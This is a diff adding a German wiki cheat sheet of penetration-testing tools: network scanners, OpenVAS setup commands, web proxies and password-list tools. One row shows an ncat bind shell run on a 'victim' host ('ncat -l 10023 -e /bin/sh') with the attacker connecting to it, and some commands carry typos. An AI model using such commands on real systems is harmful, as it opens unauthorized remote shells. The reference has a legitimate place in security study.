@@ -1,0 +1,70 @@
+====== Helfer in der Not ======
+
+ 
+^ Kommando      ^ Beschreibung      ^ Beispiel^ Erklärung ^
+| classic **nmap**    | Portscanner    | nmap -sS -A -P0 192.168.1.0/24 |scant das 1 Netz nach offnen Ports|
+| hping3   | analysiert icmp oder tcp  Pakete (alternative zu ping) |hping3 -S -p 443 jonnybravoserver.de|der Port 443 wird gepingt (istereichbar obwohl icmp auf deny steht|
+|Ncat| Ncat ist der inofizelle Nachfolger von netcat Netzwerkpor :) |<opfer>#**nohub ncat -l 10023 -n -e /bin/sh & ** <hack>#**ncat -nvv  opferrechner 10023**| In diesem Beispiel wird eine Shell auf den Port 10023 gelenkt (nach Reboot gibts die verbindung nicht mehr)|
+|netdiscover|sendet ARP Requests und wartet auf Rückmeldung danach ordnet er jeder ip die mac zu|netdiscover -r 192.168.50.0/24 -i wlan0|prüft das 50 Netz auf der Netzwerkadapter Wlan0|
+|p0f|dient der passiven Erkennung der im Einssatz befindlichen OS (analysiert die tcp/ip Struktur)|p0f -i wlan0|pürft alle verbindungen die auf den wlan0 Adapter eingehen und gibt die OS Version aus|
+|xprobe2|gibt einen ersten guten Einblick in einem Unbekannten  Netz dar (OS, Kernelversion,ip,module)|xprobe2 192.168.50.0/24|checkt das 50 Netz :) |
+
+
+
+====== Vulnerability Analysis ======
+
+**OpenVAS** Installatrionskurzanleitung
+
+Mit foglenden 3 Befehlen wird OpenVas installiert 
+
+<code bash>
+Openvas-setup
+
+openvas-scapdata-sync
+
+openvas-check-setup
+
+</code>
+
+Nach erfolgreicher Installation kann es über den Port 9392 angesprochen werden https://localhost:9392. 
+
+Weitere OpenVAS Befehle 
+
+^Kommando      ^ Beschreibung      ^
+|opernvas-nvt-sync|Aktualisierung des NVT-Feeds|
+|scapdata-sync|Aktualisierung des SCAP Feeds (optional)|
+|openvas-certdata-sync|Aktualisierung des CERTS Feeds (optional)|
+|openvassd -a 127.0.0.1 -p 9391 |Start des Scanners|
+|openvasmd -a 127.0.0.1 -p 9390 |Start des Managers von OpenVAS|
+|openvasad -a 127.0.0.1 -p 9393 |Start der Adminconsole von OpenVAS|
+|gsad -p 9392|Start der Greenbone Security Assistant Daemon mit Angabe des Ports|
+
+Kurzbeispiel : 
+
+Über konfiguration\Ziele werden die Ziele definiert (Sternsymbol) !
+Im Scanmanagment werden die Scanjobs erstellt 
+
+Nessus ist profitorientiert und keine wahl für mich,  scheiß Kapitalisten !
+
+**Web Applications**
+
+^Werkzeug      ^ Beschreibung      ^Beispiel ^Web Link ^
+|BurpSuite| in Java basierender Netzwerkanalyse-Werkzeugkasten||https://portswigger.net/buy/|
+|OWASP Zed Attack Proxy|Wird zur Analyse von Webanwendungen verwendet ||https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project|
+
+
+**Password Attacks **
+
+^Werkzeug     ^Beschreibung ^Beispiel ^Beispiel beschreibung 
+|crunch   |Mit Crunch werden Wörtbücher erstellt |crunch 4 4 1234|Die Ausgabe sind alle kominationen von 1234 mit 4 stellen |
+|PW-Inspector|optimiert Passwortlisten (gehört zur hydra-suite :) )| cat password.lst |pw-inspector -m 3 -M 5|In diesem Beispiel werden nur die Zeichen zwischen 3 und 5 ausgegeben |
+|oclHashcat|Multi-hash-fähiger Passwortknacker( top speed) alle Protokolle mysql mssql usw.|
+
+
+
+
+
+
+
+
+
